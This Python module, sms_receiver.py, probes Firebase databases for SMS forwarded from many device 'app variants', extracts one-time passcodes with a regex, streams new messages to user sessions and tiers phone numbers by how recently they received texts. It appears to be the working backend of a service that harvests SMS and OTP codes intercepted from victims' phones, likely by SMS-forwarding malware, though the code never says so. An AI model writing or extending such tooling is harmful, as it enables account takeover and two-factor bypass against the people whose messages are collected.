"""
sms_receiver.py — Dedicated SMS Receiving Module
=================================================
All Firebase SMS fetching, SSE streaming, path discovery, deduplication, and
normalisation lives here. office_relay.py imports from this module.

Tier rules (enforced externally by auto_tier_demotion + sync_one):
  last SMS < 2h   → Tier 1 Hot   (Active,   last_sms_ts > now-7200)
  last SMS 2–24h  → Tier 2 Standby (Active, last_sms_ts <= now-7200)
  last SMS > 24h  → Tier 3 Inactive (status='Inactive')
  no SMS at all   → Tier 3 Inactive

Firebase URL patterns supported:
  Pattern A   — {base}/{rootKey}/All_User/Sms/{device_id}
  Pattern A2  — {base}/{rootKey}/All_User/Info/{device_id}
  Pattern F   — {base}/user_sms/{device_id}
  Pattern G   — {base}/sms_forward/{device_id}
  Pattern H   — {base}/sms/{device_id}
  Pattern Y   — {base}/messages/{device_id}
  Pattern Z   — {base}/All_Users/sms/{device_id}
  Pattern B   — {base}/{device_id}/sms
"""

from __future__ import annotations

import asyncio
import hashlib
import json
import re
import time
from datetime import datetime
from typing import Any

import aiohttp

# ──────────────────────────────────────────────────────────────
# CONSTANTS
# ──────────────────────────────────────────────────────────────

# Firebase root keys that are not device/namespace keys
_FB_SYSTEM_KEYS = frozenset({
    "rules", ".settings", ".info", "users", "user_data", "user_sms",
    "sms_forward", "sms", "messages", "All_Users", "firebase", "metadata"
})

# All known carrier / network field names across Firebase app variants
_CARRIER_FIELDS = (
    "carrier", "Carrier", "network", "Network", "operator", "Operator",
    "simOperator", "sim_operator", "networkOperatorName", "network_operator",
    "phoneNetworkName", "simName", "telephonyManager", "serviceProviderName",
    "providerName", "mobileNetworkCode", "networkType",
)

# Rolling LRU for SMS deduplication  (key → True)
_SMS_DEDUP_CACHE: dict[str, float] = {}
_DEDUP_MAX       = 4096
_DEDUP_TTL_SECS  = 7200  # 2 hours

# Per-device last SSE event timestamp (used by watchdog in office_relay.py)
# Structure: {device_id: monotonic_time}
sse_last_event: dict[str, float] = {}


# ──────────────────────────────────────────────────────────────
# FIREBASE HTTP HELPER
# ──────────────────────────────────────────────────────────────

async def fb_get(sess: aiohttp.ClientSession, url: str,
                 api_key: str | None = None,
                 timeout: float = 6.0) -> Any:
    """GET a Firebase REST URL and return the parsed JSON (or None on error)."""
    try:
        _url = url if url.endswith(".json") or ".json?" in url else f"{url}.json"
        if api_key and "auth=" not in _url:
            sep = "&" if "?" in _url else "?"
            _url = f"{_url}{sep}auth={api_key}"
        async with sess.get(_url, timeout=aiohttp.ClientTimeout(total=timeout)) as r:
            if r.status == 200:
                return await r.json(content_type=None)
    except Exception:
        pass
    return None


# ──────────────────────────────────────────────────────────────
# SMS NORMALISATION
# ──────────────────────────────────────────────────────────────

_SMS_BODY_FIELDS   = ("message","msg","body","Body","text","Text","sms","SMS","content")
_SMS_SENDER_FIELDS = ("sender","Sender","from","From","address","Address","number","Number",
                      "phoneNumber","phone","source")
_SMS_TIME_FIELDS   = ("timestamp","backupTime","date","datetime","dateTime","time","Time",
                      "receivedAt","received_at","sentAt","sentTime","created_at","createdAt")


def _norm_sms(entry: dict) -> tuple[str, str, str]:
    """Return (message_body, sender, time_str) from a raw Firebase SMS entry dict."""
    if not isinstance(entry, dict):
        return "", "", ""
    msg    = next((str(entry[k]).strip() for k in _SMS_BODY_FIELDS   if entry.get(k)), "")
    sender = next((str(entry[k]).strip() for k in _SMS_SENDER_FIELDS if entry.get(k)), "Unknown")
    ts_str = next((str(entry[k]).strip() for k in _SMS_TIME_FIELDS   if entry.get(k)), "")
    return msg, sender, ts_str


def _parse_sms_time_ts(time_str: str) -> float:
    """
    Parse a time string (epoch ms/s, or common date formats) to a Unix epoch float.
    Returns 0.0 if unparseable.
    """
    if not time_str:
        return 0.0
    s = str(time_str).strip()
    # Pure integer — epoch seconds or ms
    if s.isdigit():
        t = int(s)
        if t > 1_000_000_000_000:
            t //= 1000  # ms → s
        if 1_000_000_000 < t < 9_999_999_999:
            return float(t)
    # Try common date formats
    fmts = (
        "%d-%m-%Y %H:%M:%S", "%Y-%m-%d %H:%M:%S", "%d/%m/%Y %H:%M:%S",
        "%d-%m-%Y %H:%M",    "%Y-%m-%d %H:%M",    "%d/%m/%Y %H:%M",
        "%Y-%m-%dT%H:%M:%S", "%Y-%m-%dT%H:%M:%SZ",
        "%d/%m/%Y %I:%M %p", "%d-%m-%Y %I:%M %p",
        "%d/%m/%Y %I:%M:%S %p", "%d-%m-%Y %I:%M:%S %p",
    )
    for fmt in fmts:
        try:
            return datetime.strptime(s, fmt).timestamp()
        except ValueError:
            continue
    return 0.0


def _latest(node: dict) -> tuple[dict | None, str]:
    """Return the (entry, key) with the most recent timestamp in a node dict."""
    best_entry, best_key, best_ts = None, "", 0.0
    for k, v in node.items():
        if not isinstance(v, dict):
            continue
        ts_str = next((str(v[f]) for f in _SMS_TIME_FIELDS if v.get(f)), "")
        ts = _parse_sms_time_ts(ts_str)
        if ts > best_ts:
            best_ts, best_entry, best_key = ts, v, k
    # Fallback: last key alphabetically (Firebase push-keys are time-ordered)
    if best_entry is None:
        items = [(k, v) for k, v in node.items() if isinstance(v, dict)]
        if items:
            best_key, best_entry = max(items, key=lambda x: x[0])
    return best_entry, best_key


def _top_n(node: dict, n: int = 5) -> list[tuple[dict, str]]:
    """Return up to n (entry, key) pairs from node, newest-first."""
    pairs = [(k, v) for k, v in node.items() if isinstance(v, dict)]
    pairs.sort(key=lambda x: _parse_sms_time_ts(
        next((str(x[1][f]) for f in _SMS_TIME_FIELDS if x[1].get(f)), "")
    ), reverse=True)
    return [(v, k) for k, v in pairs[:n]]


# ──────────────────────────────────────────────────────────────
# DEDUPLICATION
# ──────────────────────────────────────────────────────────────

def _sms_fingerprint(number: str, sender: str, body: str, ts: str) -> str:
    """Stable fingerprint for deduplication. Uses number+sender+first-50-chars+timestamp."""
    raw = f"{number}|{sender}|{body[:50]}|{ts}"
    return hashlib.md5(raw.encode("utf-8", errors="ignore")).hexdigest()


def _is_duplicate(fp: str) -> bool:
    """Return True if this fingerprint was seen within the last DEDUP_TTL_SECS."""
    now = time.monotonic()
    # Expire old entries
    if len(_SMS_DEDUP_CACHE) > _DEDUP_MAX:
        cutoff = now - _DEDUP_TTL_SECS
        for k in list(_SMS_DEDUP_CACHE):
            if _SMS_DEDUP_CACHE[k] < cutoff:
                del _SMS_DEDUP_CACHE[k]
    if fp in _SMS_DEDUP_CACHE:
        return True
    _SMS_DEDUP_CACHE[fp] = now
    return False


# ──────────────────────────────────────────────────────────────
# SMS PATH DISCOVERY
# ──────────────────────────────────────────────────────────────

def _sms_path_candidates(base: str, device_id: str, root_key: str | None = None) -> list[str]:
    """
    Return ordered list of SMS path candidates for a device.
    The list follows the priority used across all Firebase app variants
    (Patterns A, F, G, H, Y, Z, B — see module docstring).
    """
    candidates = []
    if root_key:
        candidates.append(f"{base}/{root_key}/All_User/Sms/{device_id}")   # Pattern A
    candidates += [
        f"{base}/user_sms/{device_id}",                                    # Pattern F
        f"{base}/sms_forward/{device_id}",                                 # Pattern G
        f"{base}/sms/{device_id}",                                         # Pattern H
        f"{base}/messages/{device_id}",                                    # Pattern Y
        f"{base}/All_Users/sms/{device_id}",                               # Pattern Z
        f"{base}/{device_id}/sms",                                         # Pattern B
    ]
    return candidates


async def discover_sms_path(device_id: str, fb_source: str,
                             api_key: str | None = None) -> str:
    """
    Probe all known SMS path patterns and return the first one that has data.
    Saves the result to the DB (caller is responsible) — this function only returns the path.
    Returns "" if nothing found.
    """
    if not fb_source or not device_id:
        return ""
    base = fb_source.replace(".json", "").rstrip("/")
    try:
        async with aiohttp.ClientSession() as sess:
            sh  = await fb_get(sess, f"{base}/.json?shallow=true", api_key=api_key)
            rk  = next((k for k in (sh or {}) if k not in _FB_SYSTEM_KEYS), None)
            for path in _sms_path_candidates(base, device_id, rk):
                node = await fb_get(sess, f"{path}.json", api_key=api_key)
                if isinstance(node, dict) and node:
                    return path
    except Exception:
        pass
    return ""


# ──────────────────────────────────────────────────────────────
# LATEST SMS TIMESTAMP (for tier validation)
# ──────────────────────────────────────────────────────────────

def latest_sms_ts(sms_node: dict) -> float | None:
    """
    Given an SMS node (dict of SMS entries), return the Unix timestamp of the
    most recent SMS entry, or None if no timestamp can be found.
    Used by sync_one to determine whether a number is Active (< 24h) or Inactive.
    """
    if not isinstance(sms_node, dict):
        return None
    best: float | None = None
    for val in sms_node.values():
        if not isinstance(val, dict):
            continue
        ts_str = next((str(val[f]) for f in _SMS_TIME_FIELDS if val.get(f)), "")
        ts = _parse_sms_time_ts(ts_str)
        if ts > 0 and (best is None or ts > best):
            best = ts
    return best


# ──────────────────────────────────────────────────────────────
# FETCH SINGLE LATEST SMS  (poll fallback)
# ──────────────────────────────────────────────────────────────

# Per-device last-seen SMS key  { "device_id:fb_source" → key }
_last_sms_seen: dict[str, str] = {}


async def _try_path(sess: aiohttp.ClientSession, path: str,
                    device_id: str, fb_source: str,
                    api_key: str | None) -> dict | None:
    """Attempt to fetch the latest SMS from a single Firebase path."""
    node = await fb_get(sess, f"{path}.json", api_key=api_key)
    if not isinstance(node, dict) or not node:
        return None
    entry, eid = _latest(node)
    if entry is None:
        return None
    ck = f"{device_id}:{fb_source}"
    if _last_sms_seen.get(ck) == eid:
        return None  # already seen — dedup
    _last_sms_seen[ck] = eid
    msg, sender, ts = _norm_sms(entry)
    if not msg:
        return None
    otp = re.search(r'\b(\d{4,8})\b', msg)
    return {"otp": otp.group(1) if otp else None,
            "sender": sender, "message": msg, "time": ts}


async def fetch_sms(number: str, device_id: str, fb_source: str,
                    sms_path: str | None = None,
                    api_key: str | None = None) -> dict | None:
    """
    Fetch the single most-recent SMS for a device.

    Speed optimisation: if sms_path is already known (cached in DB), skip the
    expensive shallow root probe and go straight to the known path + one fallback.
    Only probes all candidates when sms_path is unknown.

    Returns a dict with keys: number, sender, message, time, otp  — or None.
    """
    try:
        async with aiohttp.ClientSession() as sess:
            if api_key is None:
                api_key = _get_api_key_for(fb_source)
            paths: list[tuple[str, str, str | None]] = []
            if sms_path:
                paths.append((sms_path, fb_source, api_key))
            if fb_source:
                base = fb_source.replace(".json", "").rstrip("/")
                if sms_path:
                    # Path known — just add sms_forward as a cheap fallback
                    fwd = f"{base}/sms_forward/{device_id}"
                    if (fwd, fb_source, api_key) not in paths:
                        paths.append((fwd, fb_source, api_key))
                else:
                    # Path unknown — probe all candidates
                    sh  = await fb_get(sess, f"{base}/.json?shallow=true", api_key=api_key)
                    rk  = next((k for k in (sh or {}) if k not in _FB_SYSTEM_KEYS), None)
                    for p in _sms_path_candidates(base, device_id, rk):
                        if (p, fb_source, api_key) not in paths:
                            paths.append((p, fb_source, api_key))
            for path, src, key in paths:
                result = await _try_path(sess, path, device_id, src, key)
                if result:
                    result["number"] = number
                    return result
    except Exception:
        pass
    return None


async def fetch_last_n_sms(number: str, device_id: str, fb_source: str,
                            sms_path: str | None = None,
                            n: int = 5,
                            api_key: str | None = None) -> list[dict]:
    """
    Fetch the n most-recent SMS messages for a device.
    Same sms_path speed optimisation as fetch_sms.
    Each entry: {sender, message, time, otp}
    """
    results: list[dict] = []
    try:
        async with aiohttp.ClientSession() as sess:
            if api_key is None:
                api_key = _get_api_key_for(fb_source)
            paths: list[str] = []
            if sms_path:
                paths.append(sms_path)
            if fb_source:
                base = fb_source.replace(".json", "").rstrip("/")
                if sms_path:
                    fwd = f"{base}/sms_forward/{device_id}"
                    if fwd not in paths:
                        paths.append(fwd)
                else:
                    sh = await fb_get(sess, f"{base}/.json?shallow=true", api_key=api_key)
                    rk = next((k for k in (sh or {}) if k not in _FB_SYSTEM_KEYS), None)
                    for p in _sms_path_candidates(base, device_id, rk):
                        if p not in paths:
                            paths.append(p)
            for path in paths:
                node = await fb_get(sess, f"{path}.json", api_key=api_key)
                if not isinstance(node, dict) or not node:
                    continue
                for entry, _ in _top_n(node, n):
                    msg, sender, ts = _norm_sms(entry)
                    if msg:
                        otp = re.search(r'\b(\d{4,8})\b', msg)
                        results.append({"sender": sender, "message": msg,
                                        "time": ts, "otp": otp.group(1) if otp else None})
                if results:
                    break
    except Exception:
        pass
    return results


# ──────────────────────────────────────────────────────────────
# SSE STREAMING LISTENER
# ──────────────────────────────────────────────────────────────

async def sse_listener(
    sms_path: str,
    device_id: str,
    fb_source: str,
    api_key: str | None,
    queue: asyncio.Queue,
    active_sessions: dict,      # {uid: True/False} — passed in from office_relay
    uid: int,
    session_start_ts: int = 0,  # epoch — SSE events older than this are skipped
) -> None:
    """
    Stream Firebase Realtime Database events for a device via SSE.

    Key behaviours
    ──────────────
    • Auto-discovers sms_path if not provided.
    • Correctly seeds seen_keys from the initial "/" put so pre-session SMS are skipped.
    • seen_keys persist across reconnects to avoid re-broadcasting already-sent SMS.
    • Any SMS whose parsed timestamp < session_start_ts - 30s is skipped (pre-session guard).
    • Updates sse_last_event[device_id] on every real event (watchdog hook).
    """
    if not sms_path:
        sms_path = await discover_sms_path(device_id, fb_source, api_key)
        if not sms_path:
            return

    base_path = sms_path.replace(".json", "").rstrip("/")
    url       = f"{base_path}.json?orderBy=%22%24key%22&limitToLast=10"
    if api_key:
        url += f"&auth={api_key}"
    headers   = {"Accept": "text/event-stream", "Cache-Control": "no-cache"}

    seen_keys: set[str] = set()
    initial_loaded      = False

    while active_sessions.get(uid):
        try:
            async with aiohttp.ClientSession() as sess:
                async with sess.get(url, headers=headers,
                                    timeout=aiohttp.ClientTimeout(connect=10, total=None)) as resp:
                    if resp.status != 200:
                        await asyncio.sleep(5)
                        continue
                    event_type: str | None = None
                    async for raw_line in resp.content:
                        if not active_sessions.get(uid):
                            return
                        line = raw_line.decode("utf-8", errors="ignore").rstrip("\r\n")
                        if line.startswith("event:"):
                            event_type = line[6:].strip()
                        elif line.startswith("data:") and event_type in ("put", "patch"):
                            try:
                                payload = json.loads(line[5:].strip())
                                path    = payload.get("path", "")
                                data    = payload.get("data")

                                if data is None:
                                    initial_loaded = True
                                    event_type = None
                                    continue

                                if path == "/" and not initial_loaded:
                                    # Seed seen_keys with ALL existing entries — these are
                                    # pre-session SMS that must NOT be re-delivered.
                                    if isinstance(data, dict):
                                        seen_keys.update(data.keys())
                                    initial_loaded = True
                                    event_type = None
                                    continue

                                # Record liveness for watchdog
                                sse_last_event[device_id] = asyncio.get_event_loop().time()

                                def _enqueue(entry: dict, key: str) -> None:
                                    if not isinstance(entry, dict):
                                        return
                                    # Pre-session guard
                                    if session_start_ts > 0:
                                        ts_str = next((str(entry[f]) for f in _SMS_TIME_FIELDS
                                                       if entry.get(f)), "")
                                        ts = _parse_sms_time_ts(ts_str)
                                        if ts > 0 and ts < session_start_ts - 30:
                                            return
                                    queue.put_nowait((entry, key))

                                if path == "/" and isinstance(data, dict):
                                    for k, v in data.items():
                                        if k not in seen_keys:
                                            seen_keys.add(k)
                                            _enqueue(v, k)
                                elif path and path != "/" and isinstance(data, dict):
                                    key = path.lstrip("/").split("/")[0]
                                    if key and key not in seen_keys:
                                        seen_keys.add(key)
                                        _enqueue(data, key)
                                    elif key and isinstance(data, dict):
                                        for sk, sv in data.items():
                                            sub_key = f"{key}/{sk}"
                                            if sub_key not in seen_keys:
                                                seen_keys.add(sub_key)
                                                _enqueue(sv, sub_key)
                            except Exception:
                                pass
                            event_type = None
                        elif line == "":
                            event_type = None
        except asyncio.CancelledError:
            return
        except Exception:
            await asyncio.sleep(5)


# ──────────────────────────────────────────────────────────────
# API KEY HELPER  (filled in by office_relay at import time)
# ──────────────────────────────────────────────────────────────

# office_relay.py sets this after import:
#   import sms_receiver
#   sms_receiver._get_api_key_for = _get_fb_apikey
_get_api_key_for = lambda fb_source: None  # noqa: E731  placeholder


# ──────────────────────────────────────────────────────────────
# TIER CLASSIFICATION HELPERS
# ──────────────────────────────────────────────────────────────

def tier_of(last_sms_ts: float | None,
            status: str,
            is_ghost: bool,
            report_count: int = 0) -> int:
    """
    Return the tier number (1/2/3) for a number record.
      1 = Hot     (Active + SMS in last 2h,  no dead reports)
      2 = Standby (Active + SMS older than 2h, or ≥3 reports)
      3 = Offline (Inactive, ghost, or dead)
    """
    if is_ghost or status not in ("Active",):
        return 3
    now = time.time()
    if report_count >= 3:
        return 2
    if last_sms_ts and (now - last_sms_ts) <= 7200:
        return 1
    return 2


def should_promote(last_sms_ts: float | None, window_secs: int = 3600) -> bool:
    """
    True if last_sms_ts is within window_secs — number is "waking up" and
    should be highlighted as about to enter Tier 1 on next refresh.
    Default window: 1 hour.
    """
    if not last_sms_ts:
        return False
    return (time.time() - last_sms_ts) <= window_secs
